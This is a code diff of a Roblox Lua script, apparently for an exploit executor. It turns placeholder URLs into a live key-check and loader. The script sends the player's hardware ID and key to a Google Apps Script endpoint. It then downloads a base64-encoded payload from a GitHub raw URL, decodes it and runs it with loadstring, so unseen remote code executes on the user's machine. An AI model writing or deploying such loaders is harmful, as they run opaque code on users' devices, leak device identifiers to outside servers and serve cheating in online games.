@@ -1,34 +1,30 @@
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-local KEY = getgenv().key or ""
+local API = "https://script.google.com/macros/s/AKfycbw6nkv47LmFiaOOF8uA1LZcUyM_sxkEbY1QW73bVXw4elBqTtPkilE8kxSni5OSkAfb/exec"
+local _KEY = getgenv().key or ""
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local HWID =
-game:GetService("RbxAnalyticsService"):GetClientId()
-
-local API =
-"ใส่ลิงก์_APPS_SCRIPT_/exec"
-
-local ok, response = pcall(function()
-
-    return game:HttpGet(
-        API ..
-        "?key=" .. HttpService:UrlEncode(KEY) ..
-        "&hwid=" .. HttpService:UrlEncode(HWID)
-    )
-
-end)
-
-if not ok then
-    error("SERVER OFFLINE")
+local function Auth()
+    local url = API.."?key="..HttpService:UrlEncode(_KEY).."&hwid="..HttpService:UrlEncode(HWID)
+    local success, res = pcall(function() return game:HttpGet(url) end)
+    
+    if success then
+        if res == "SUCCESS" then
+            local p_url = "https://raw.githubusercontent.com/beiryreiyr7-crypto/Thai/main/Payload.txt"
+            local s, data = pcall(function() return game:HttpGet(p_url) end)
+            if s and data then
+                local func, err = loadstring(HttpService:Base64Decode(data))
+                if func then func() else warn("LoadError: "..tostring(err)) end
+            else
+                LocalPlayer:Kick("Fetch Error")
+            end
+        else
+            LocalPlayer:Kick("Auth Failed: "..tostring(res))
+        end
+    else
+        LocalPlayer:Kick("Server Offline")
+    end
 end
-
-if response ~= "SUCCESS" then
-    error(response)
-end
-
-local stage2 =
-game:HttpGet(
-"https://raw.githubusercontent.com/USERNAME/REPO/main/Stage2.lua"
-)
-
-loadstring(stage2)()
+Auth()
